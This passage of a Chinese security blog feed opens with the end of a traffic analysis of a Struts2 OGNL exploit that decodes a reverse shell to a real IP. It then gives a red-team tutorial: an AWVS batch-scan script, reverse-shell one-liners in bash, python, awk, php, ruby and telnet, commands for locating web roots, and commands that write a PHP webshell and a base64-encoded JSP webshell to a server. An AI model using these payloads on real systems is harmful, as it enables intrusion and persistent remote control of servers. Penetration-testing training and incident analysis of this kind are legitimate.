class="line"><span class="meta">(#</span><span class="bash">dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(<span class="comment">#ct=#request[&#x27;struts.valueStack&#x27;].context).(#cr=#ct[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi4xNC4xOTAuOTMvMjMzMyAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;/actionChain1.action</span></span></span><br></pre></td></tr></table></figure><p>发现攻击者在尝试反弹shell</p><p>paylaod中的base64字符串解码得到：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp;/dev/tcp/106.14.190.93/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>说明攻击者想将shell反弹到106.14.190.93的2333端口</p><h3 id="3-3-3-查看攻击者是否拿到shell，并执行了那些操作"><a href="#3-3-3-查看攻击者是否拿到shell，并执行了那些操作" class="headerlink" title="3.3.3 查看攻击者是否拿到shell，并执行了那些操作"></a>3.3.3 查看攻击者是否拿到shell，并执行了那些操作</h3><p>已经确定反弹shell的vps，那么直接查看与该ip的数据流</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr==106.14.190.93</span><br></pre></td></tr></table></figure><p><img src="3.3.4.png" alt="3.3.4"></p><p>发现数据中存在服务器名，跟踪tcp流，发现攻击者执行了ls命令，并且执行成功。</p><p><img src="3.3.5.png" alt="3.3.5"></p><p>参考链接：</p><p><a href="https://www.cnblogs.com/linyfeng/p/9496126.html">https://www.cnblogs.com/linyfeng/p/9496126.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wireshark使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何为红队大佬端茶倒水上线cs</title>
      <link href="/2019/07/05/%E5%A6%82%E4%BD%95%E4%B8%BA%E7%BA%A2%E9%98%9F%E5%A4%A7%E4%BD%AC%E7%AB%AF%E8%8C%B6%E5%80%92%E6%B0%B4%E4%B8%8A%E7%BA%BFcs/"/>
      <url>/2019/07/05/%E5%A6%82%E4%BD%95%E4%B8%BA%E7%BA%A2%E9%98%9F%E5%A4%A7%E4%BD%AC%E7%AB%AF%E8%8C%B6%E5%80%92%E6%B0%B4%E4%B8%8A%E7%BA%BFcs/</url>
      
        <content type="html"><![CDATA[<p>安服仔，最近做了好几个项目都是红队服务，我一ctf签到选手，src低危挖掘者，日常项目低危三连玩家哪懂这啊。好在大佬们实在太猛，给大佬们端茶倒水好好学习了一波。</p><h2 id="1-前期打点"><a href="#1-前期打点" class="headerlink" title="1.前期打点"></a>1.前期打点</h2><p>前期打点个人感觉就是批量批量再批量，红队服务不同于日常项目一个登陆框日一天，可以针对目标范围内所有资产进行渗透，这个时候大范围收集相关子域名，c段就很有必要。资产直接找客户要，客户很多都会给。也可以自己收集，google找到官网，<a href="https://github.com/shmilylty/OneForAll">onefoeall</a>收集子域名，<a href="https://github.com/TophantTechnology/ARL">ARL</a>收集相关资产…方法很多。</p><p>收集到了足够的资产之后，就是快乐的批量打点时间，作为一个没有0day，没有批量脚本的菜鸡，当然要充分发挥各大工具的作用。</p><h3 id="1-1-awvs"><a href="#1-1-awvs" class="headerlink" title="1.1 awvs"></a>1.1 awvs</h3><p>awvs这个不用多说，收集到的子域名直接往里面导入就完事，子域名太多不想手动？批量脚本来一波，该脚本导入url的同时可开启awvs的代理联动xray，在相同目录下新建url.txt文件，将需要扫描的url放到里面即可，一次性导入太多子域名可能会卡，可以根据自身主机性能适当调整导入50个还是100个…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span>  requests.packages</span><br><span class="line"><span class="keyword">import</span>  urllib3.packages</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"><span class="comment"># from requests.packages.urllib3.exceptions import InsecureRequestWarning</span></span><br><span class="line"><span class="comment"># requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span></span><br><span class="line">urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">apikey = <span class="string">&#x27;1986ad8c0a5b3df4d7028d5f3c06e936c824cdd6ca6d14ec78eed27dce5423fa8&#x27;</span></span><br><span class="line"><span class="comment"># 去 AWVS 配置文件里面  有个 API KEY  复制填进去就行</span></span><br><span class="line">apikey = <span class="built_in">str</span>(apikey)</span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,<span class="string">&quot;X-Auth&quot;</span>: apikey&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addTask</span>(<span class="params">url,target</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">&#x27;&#x27;</span>.join((url, <span class="string">&#x27;/api/v1/targets/add&#x27;</span>))</span><br><span class="line">        data = &#123;<span class="string">&quot;targets&quot;</span>:[&#123;<span class="string">&quot;address&quot;</span>: target,<span class="string">&quot;description&quot;</span>:<span class="string">&quot;&quot;</span>&#125;],<span class="string">&quot;groups&quot;</span>:[]&#125;</span><br><span class="line">        r = requests.post(url, headers=headers, data=json.dumps(data), timeout=<span class="number">30</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        result = json.loads(r.content.decode())</span><br><span class="line">        <span class="keyword">return</span> result[<span class="string">&#x27;targets&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;target_id&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> e</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">url,target,Crawl,user_agent,profile_id,proxy_address,proxy_port</span>):</span></span><br><span class="line">    scanUrl = <span class="string">&#x27;&#x27;</span>.join((url, <span class="string">&#x27;/api/v1/scans&#x27;</span>))</span><br><span class="line">    target_id = addTask(url,target)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> target_id:</span><br><span class="line">        data = &#123;<span class="string">&quot;target_id&quot;</span>: target_id, <span class="string">&quot;profile_id&quot;</span>: profile_id, <span class="string">&quot;incremental&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;schedule&quot;</span>: &#123;<span class="string">&quot;disable&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;start_date&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;time_sensitive&quot;</span>: <span class="literal">False</span>&#125;&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            configuration(url,target_id,proxy_address,proxy_port,Crawl,user_agent)</span><br><span class="line">            response = requests.post(scanUrl, data=json.dumps(data), headers=headers, timeout=<span class="number">30</span>, verify=<span class="literal">False</span>)</span><br><span class="line">            result = json.loads(response.content)</span><br><span class="line">            <span class="keyword">return</span> result[<span class="string">&#x27;target_id&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configuration</span>(<span class="params">url,target_id,proxy_address,proxy_port,Crawl,user_agent</span>):</span></span><br><span class="line">    configuration_url = <span class="string">&#x27;&#x27;</span>.join((url,<span class="string">&#x27;/api/v1/targets/&#123;0&#125;/configuration&#x27;</span>.<span class="built_in">format</span>(target_id)))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#取消注释可使用awvs的代理功能，代理地址为：127.0.0.1:7777可，本地启动xray监听即可联动xray，非常的人性化</span></span><br><span class="line">    <span class="comment">#data = &#123;&quot;scan_speed&quot;:&quot;fast&quot;,&quot;login&quot;:&#123;&quot;kind&quot;:&quot;none&quot;&#125;,&quot;ssh_credentials&quot;:&#123;&quot;kind&quot;:&quot;none&quot;&#125;,&quot;sensor&quot;: False,&quot;user_agent&quot;: user_agent,&quot;case_sensitive&quot;:&quot;auto&quot;,&quot;limit_crawler_scope&quot;: True,&quot;excluded_paths&quot;:[],&quot;authentication&quot;:&#123;&quot;enabled&quot;: False&#125;,&quot;proxy&quot;:&#123;&quot;enabled&quot;: True,&quot;protocol&quot;:&quot;http&quot;,&quot;address&quot;:proxy_address,&quot;port&quot;:proxy_port&#125;,&quot;technologies&quot;:[],&quot;custom_headers&quot;:[],&quot;custom_cookies&quot;:[],&quot;debug&quot;:False,&quot;client_certificate_password&quot;:&quot;&quot;,&quot;issue_tracker_id&quot;:&quot;&quot;,&quot;excluded_hours_id&quot;:&quot;&quot;&#125;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#不使用代理</span></span><br><span class="line">    data = &#123;<span class="string">&quot;scan_speed&quot;</span>:<span class="string">&quot;fast&quot;</span>,<span class="string">&quot;login&quot;</span>:&#123;<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;none&quot;</span>&#125;,<span class="string">&quot;ssh_credentials&quot;</span>:&#123;<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;none&quot;</span>&#125;,<span class="string">&quot;sensor&quot;</span>: <span class="literal">False</span>,<span class="string">&quot;user_agent&quot;</span>: user_agent,<span class="string">&quot;case_sensitive&quot;</span>:<span class="string">&quot;auto&quot;</span>,<span class="string">&quot;limit_crawler_scope&quot;</span>: <span class="literal">True</span>,<span class="string">&quot;excluded_paths&quot;</span>:[],<span class="string">&quot;authentication&quot;</span>:&#123;<span class="string">&quot;enabled&quot;</span>: <span class="literal">False</span>&#125;,<span class="string">&quot;proxy&quot;</span>:&#123;<span class="string">&quot;enabled&quot;</span>: Crawl,<span class="string">&quot;protocol&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;address&quot;</span>:proxy_address,<span class="string">&quot;port&quot;</span>:proxy_port&#125;,<span class="string">&quot;technologies&quot;</span>:[],<span class="string">&quot;custom_headers&quot;</span>:[],<span class="string">&quot;custom_cookies&quot;</span>:[],<span class="string">&quot;debug&quot;</span>:<span class="literal">False</span>,<span class="string">&quot;client_certificate_password&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;issue_tracker_id&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;excluded_hours_id&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">    r = requests.patch(url=configuration_url,data=json.dumps(data), headers=headers, timeout=<span class="number">30</span>, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    Crawl = <span class="literal">False</span></span><br><span class="line">    proxy_address = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">    proxy_port = <span class="string">&#x27;7777&#x27;</span></span><br><span class="line">    awvs_url = <span class="string">&#x27;https://127.0.0.1:13443/&#x27;</span> <span class="comment">#awvs url</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;url.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        targets = f.readlines()</span><br><span class="line">    profile_id = <span class="string">&quot;11111111-1111-1111-1111-111111111111&quot;</span></span><br><span class="line">    user_agent = <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21&quot;</span> <span class="comment">#扫描默认UA头</span></span><br><span class="line">    <span class="keyword">if</span> Crawl:</span><br><span class="line">        profile_id = <span class="string">&quot;11111111-1111-1111-1111-111111111117&quot;</span></span><br><span class="line">    <span class="keyword">for</span> target <span class="keyword">in</span> targets:</span><br><span class="line">        target = target.strip()</span><br><span class="line">        <span class="keyword">if</span> scan(awvs_url,target,Crawl,user_agent,profile_id,proxy_address,<span class="built_in">int</span>(proxy_port)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;0&#125; 添加成功&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="1-2-goby"><a href="#1-2-goby" class="headerlink" title="1.2 goby"></a>1.2 goby</h3><p>goby也是一个批量打点的好东西，收集到的子域名，C段，往里面一导等着出结果就完事。但是goby我习惯开全端口，这就导致结果出的比较慢，为了不显得那么划水，可以实时查看goby识别出的web网站，结合xray插件提高效率</p><p><img src="1.2.1.png" alt="1.2.1"></p><p>像这种准确识别出title头的网站，不要犹豫点击xray按钮干他。</p><p><img src="1.2.2.png" alt="1.2.2"></p><h3 id="1-3-大佬分享的护网自动化小脚本"><a href="#1-3-大佬分享的护网自动化小脚本" class="headerlink" title="1.3 大佬分享的护网自动化小脚本"></a>1.3 大佬分享的护网自动化小脚本</h3><p>护网自动化脚本：<a href="https://mp.weixin.qq.com/s/uHNx28XFZ5M6KwykMC4Jsg">https://mp.weixin.qq.com/s/uHNx28XFZ5M6KwykMC4Jsg</a></p><p>github地址：<a href="https://github.com/0x9f99/Recon">https://github.com/0x9f99/Recon</a></p><p>该项目牛逼的地方在于，你只要给他一个域名列如：./recon.sh domain.com 他就会自动收集子域名，解析对应ip保留c段进行masscan+nmap的全端口扫描，</p><p>并对扫描的结果进行插件中集成的poc探测。假如头一天接到红队项目，知道明天要去打红队，那晚上先在服务器上<code>./recon.sh domain.com &gt; log.txt 2&gt;&amp;1 &amp;</code> 第二天起床上班看结果，岂不美滋滋。</p><p>还有很多打点的方法，菜鸡只分享自己会的，欢迎大佬们补充教教我…</p><h3 id="1-4-动静比较小的打法"><a href="#1-4-动静比较小的打法" class="headerlink" title="1.4 动静比较小的打法"></a>1.4 动静比较小的打法</h3><p>一些红队测试可能会有溯源，反制等操作。这时候awvs/goby这些动静大的工具一开，可能很快就报警被拦截了。这时候就要换点思路了。</p><p>arl就是一款不错的工具，利用自己编写的探测指纹，优先识别出目标资产中例如：struts2/weblogic/shiro等组件开发的系统。针对性去重点测试。</p><p>更多可以参考我的文章：<a href="https://h11ba1.com/posts/arl_poc%E7%BC%96%E5%86%99.html">https://h11ba1.com/posts/arl_poc%E7%BC%96%E5%86%99.html</a></p><h2 id="2-打点之后的持续深入"><a href="#2-打点之后的持续深入" class="headerlink" title="2. 打点之后的持续深入"></a>2. 打点之后的持续深入</h2><p>日常只会发现漏洞，找到一个s2，shiro之类的命令执行，第一时间竟感到一丝茫然Σ(っ °Д °;)っ</p><p>看了大佬们的操作后，及时学习了一波</p><p>找到命令执行之后先判断，是linux还是windows服务器，个人感觉两种服务器略有不同的渗透方法，linux服务器更多的考虑上线代理脚本进行内网渗透，windows服务器肯定要上线cs或者打一个msf的meterpreter。</p><h3 id="linux主机"><a href="#linux主机" class="headerlink" title="linux主机"></a>linux主机</h3><p>当然第一步肯定先建立一个稳定的入口点，可以考虑反弹shell或者写一个webshell，方便接下来的渗透，</p><h4 id="2-1-反弹shell"><a href="#2-1-反弹shell" class="headerlink" title="2.1 反弹shell"></a>2.1 反弹shell</h4><p>反弹shell一般使用bash</p><p>bash:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64编码为&#x27;bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1&#x27;编码</span><br><span class="line"></span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Ni4xMjkvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>python:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><p>awk:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.1.128/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><p>ruby</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;ip&quot;,port).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure><p>telnet:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod test p &amp;&amp; telnet ip port 0&lt;test | /bin/bash 1&gt;test</span><br><span class="line">telnet ip port | /bin/bash | telnet ip port</span><br></pre></td></tr></table></figure><h4 id="2-2-写入webshell"><a href="#2-2-写入webshell" class="headerlink" title="2.2 写入webshell"></a>2.2 写入webshell</h4><p>命令执行到写入webshell还是有很多坑的，接下来简单记录学习到的方法</p><h5 id="web路径发现"><a href="#web路径发现" class="headerlink" title="web路径发现"></a>web路径发现</h5><p>find命令直接查找web文件，这里查找js文件，可以在网站首页查看js文件名，针对性查找，也可以使用*.js查找所有。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name *.js</span><br><span class="line"></span><br><span class="line">查找的文件太大，可能会卡死可以只返回固定行数</span><br><span class="line">find / -name *.html &gt; result;head -n 10 result;rm result</span><br></pre></td></tr></table></figure><p>读取web日志,查看web路径</p><p>查看log位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -name log</span><br><span class="line">find / -name nginx.conf</span><br><span class="line">find / -name httpd.conf</span><br><span class="line">查找含有web关键字的文件名</span><br><span class="line">find / -name &#x27;*web*&#x27;</span><br></pre></td></tr></table></figure><p>常见日志位置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">/var/<span class="built_in">log</span>/access_log</span><br><span class="line">/var/<span class="built_in">log</span>/errors_log</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/access.log</span><br><span class="line">/var/<span class="built_in">log</span>/errors.log</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/apache/access_log</span><br><span class="line">/var/<span class="built_in">log</span>/apache/error_log</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/apache/access.log</span><br><span class="line">/var/<span class="built_in">log</span>/apache/error.log</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/apache2/access_log</span><br><span class="line">/var/<span class="built_in">log</span>/apache2/error_log</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/apache2/access.log</span><br><span class="line">/var/<span class="built_in">log</span>/apache2/error.log</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/httpd/access_log</span><br><span class="line">/var/<span class="built_in">log</span>/httpd/error_log</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/httpd/access.log</span><br><span class="line">/var/<span class="built_in">log</span>/httpd/error.log</span><br><span class="line"></span><br><span class="line">/var/www/logs/error_log</span><br><span class="line">/var/www/logs/access_log</span><br><span class="line"></span><br><span class="line">/var/www/logs/error.log</span><br><span class="line">/var/www/logs/access.log</span><br><span class="line"></span><br><span class="line">/apache/logs/error_log</span><br><span class="line">/apache/logs/access_log</span><br><span class="line"></span><br><span class="line">/apache/logs/error.log</span><br><span class="line">/apache/logs/access.log</span><br><span class="line"></span><br><span class="line">/usr/<span class="built_in">local</span>/apache/logs/access_log</span><br><span class="line">/usr/<span class="built_in">local</span>/apache/logs/error_log</span><br><span class="line"></span><br><span class="line">/usr/<span class="built_in">local</span>/apache/logs/access.log</span><br><span class="line">/usr/<span class="built_in">local</span>/apache/logs/error.log</span><br><span class="line"></span><br><span class="line">/usr/<span class="built_in">local</span>/apache2/logs/access_log</span><br><span class="line">/usr/<span class="built_in">local</span>/apache2/logs/error_log</span><br><span class="line"></span><br><span class="line">/usr/<span class="built_in">local</span>/apache2/logs/access.log</span><br><span class="line">/usr/<span class="built_in">local</span>/apache2/logs/error.log</span><br><span class="line"></span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/etc/httpd/logs/error_log</span><br><span class="line"></span><br><span class="line">C:\PhpStudy\PHPTutorial\Apache\logs\access.log</span><br><span class="line">C:\PhpStudy\PHPTutorial\Apache\logs\error.log</span><br></pre></td></tr></table></figure><p>也可以读取配置文件来查找对应的日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/usr/<span class="built_in">local</span>/apache/conf/httpd.conf</span><br><span class="line">/usr/<span class="built_in">local</span>/apache2/conf/httpd.conf</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># nginx -t 测试配置文件是否正确，同时也告诉了配置文件的路径</span></span><br><span class="line">/usr/<span class="built_in">local</span>/etc/nginx/nginx.conf</span><br><span class="line">/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p>Window 2003 + IIS6.0 日志文件默认放在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\Logfiles</span><br><span class="line">配置文件默认在</span><br><span class="line">C:\Windows\system32\inetsrv\metabase.xml</span><br></pre></td></tr></table></figure><p>IIS 7 日志文件默认在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\logs\LogFiles</span><br></pre></td></tr></table></figure><p>配置文件默认目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\inetsrv\config\applicationHost.config</span><br><span class="line">C:\apache\logs\access.log</span><br><span class="line">C:\Program Files\Apache Group\Apache\logs\access.log</span><br><span class="line">C:\program files\wamp\apache2\logs</span><br><span class="line">C:\wamp\logs</span><br><span class="line">C:\xampp\apache\logs\error.log</span><br><span class="line">C:\apache\logs\error.log</span><br><span class="line">C:\Program Files\Apache Group\Apache\logs\error.log</span><br><span class="line">C:\wamp\apache2\logs</span><br><span class="line">C:\xampp\apache\logs\access.log</span><br></pre></td></tr></table></figure><h5 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h5><p>发现web路径之后可写入webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php $_REQUEST[1];?&gt;&#x27; &gt; /var/www/html/phpinfo.php</span><br></pre></td></tr></table></figure><p>webshell简单编码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将webshell使用burp base64编码 </span><br><span class="line"></span><br><span class="line">echo -n &quot;PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7LyrlxqU63qXGATMyTW1kNTyETTE2TQzYpN6lxgFyZWJleW9uZCovc2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4=&quot; | base64 -d &gt; /var/www/test.jsp</span><br></pre></td></tr></table></figure><h4 id="2-3-上线代理"><a href="#2-3-上线代理" class="headerlink" title="2.3 